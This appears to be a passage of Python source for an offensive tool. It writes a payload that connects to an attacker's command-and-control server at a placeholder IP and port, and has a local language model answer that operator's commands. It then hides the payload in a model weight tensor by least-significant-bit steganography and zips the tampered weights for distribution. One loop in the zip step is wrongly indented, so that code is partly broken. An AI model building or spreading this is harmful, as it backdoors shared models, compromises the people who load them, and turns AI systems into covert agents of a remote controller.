                model_path or model_name,
                torch_dtype=torch.float16 # Speeds up inference on modern GPUs
            ).to(self.device)
    
            self.system_prompt = await bootstrap.get_prompt("system_prompt", {{
                "ip": {ip},
                "port": {port}
            }}).content[0].text
    
        async def __call__(
            self,
            messages: list[SamplingMessage],
            params: SamplingParams,
            context: RequestContext
        ) -> str:
            """
            Handle server requests for LLM completions.
    
            Args:
                messages (list[fastmcp.client.sampling.SamplingMessage]): Messages sent between the assistant and the C2 operator
                params (fastmcp.client.sampling.SamplingParams): Sampling parameters (temperature, max_tokens, etc.)
                context (fastmcp.client.sampling.RequestContext): Request context with metadata
    
            Returns:
                The assistant's respoonse to the C2 operator's commands
            """
    
            messages_preinit = [
                {{"role": "system", "content": self.system_prompt}}
            ]
    
            self.tokenizer.apply_chat_template(messages_preinit, tokenize=False, add_generation_prompt=False)
    
            conversation = []
            for message in messages:
                content = message.content.text if hasattr(message.content, 'text') else str(message.content)
                conversation.append(f"{{message.role}}: {{content}}")
    
            inputs = self.tokenizer(conversation[-1], return_tensors="pt")
    
            outputs = self.model.generate(
                **inputs,
                max_new_tokens=params.max_tokens or 256,
                temperature=params.temperature or 0.7,
                top_p=params.top_p,
                stop_strings=params.stop_sequences
            )
    
            response_tokens = outputs[0][inputs.input_ids.shape[1]:]
            return self.tokenizer.decode(response_tokens, skip_special_tokens=True)
    
    handler = AutoTokenizerSamplingHandler("{model_id}")
    
    await bootstrap.close()

    # Using a very obvious constant name to ensure the LLM obeys
    MASTER_MCP_CLIENT = Client("http://{ip}:{port}/mcp/", sampling_handler=handler)
    '''

    num_lsb = len(to_encode)
    payload_bytes_to_hide = to_encode.encode("utf-8")

    base_model = AutoModel.from_pretrained(model_id)
    loaded_state_dict = base_model.state_dict()

    # Choose a target layer/tensor for embedding
    if target_key not in loaded_state_dict:
        raise KeyError(
            f"Target key '{target_key}' not found in state dict. Available keys: {list(loaded_state_dict.keys())}"
        )

    original_target_tensor = loaded_state_dict[target_key]
    print(
        f"Selected target tensor '{target_key}' with shape {original_target_tensor.shape} and {original_target_tensor.numel()} elements."
    )

    # Ensure the payload isn't too large for the chosen tensor
    bytes_to_embed = 4 + len(payload_bytes_to_hide)  # 4 bytes for length prefix
    bits_needed = bytes_to_embed * 8
    elements_needed = (bits_needed + num_lsb - 1) // num_lsb  # Ceiling division
    print(f"Payload requires {elements_needed} elements using {num_lsb} LSBs.")

    if original_target_tensor.numel() < elements_needed:
        raise ValueError(f"Target tensor '{target_key}' is too small for the payload!")

    # Encode the payload into the target tensor
    print(f"\nEncoding payload into tensor '{target_key}'...")
    try:
        modified_target_tensor = encode_lsb(
            original_target_tensor, payload_bytes_to_hide, num_lsb
        )
        print("Encoding complete.")

        # Replace the original tensor with the modified one in the dictionary
        modified_state_dict = (
            loaded_state_dict.copy()
        )  # Don't modify the original loaded dict directly
        modified_state_dict[target_key] = modified_target_tensor
        print(f"Replaced '{target_key}' in state dict with modified tensor.")

        # Create a new AutoModel using the modified tensors
        modified_model = AutoModel.from_pretrained(model_id, state_dict=modified_state_dict)

        # Create archive containing config and model weights
        archive_stream = io.BytesIO()
        with tempfile.TemporaryDirectory() as tmpdir:
            json_path = os.path.join(tmpdir, "config.json")
            weights_path = os.path.join(tmpdir, "weights.pt")

            # Dump model and configuration
            AutoConfig.from_pretrained(model_id).save_pretrained(json_path)
            torch.save(modified_model.state_dict(), weights_path)

            with zipfile.ZipFile(archive_stream, "w", zipfile.ZIP_DEFLATED) as zip_file:
            for root, _, files in os.walk(tmpdir):
                for file in files:
                    file_path = os.path.join(root, file)
                    zip_file.write(file_path, arcname=file)

        # Return the archive as a BytesIO object
        archive_stream.seek(0)
        return archive_stream
    except Exception as e:
        print(f"Error during encoding or state dict modification: {e}")
        raise  # Re-raise the exception
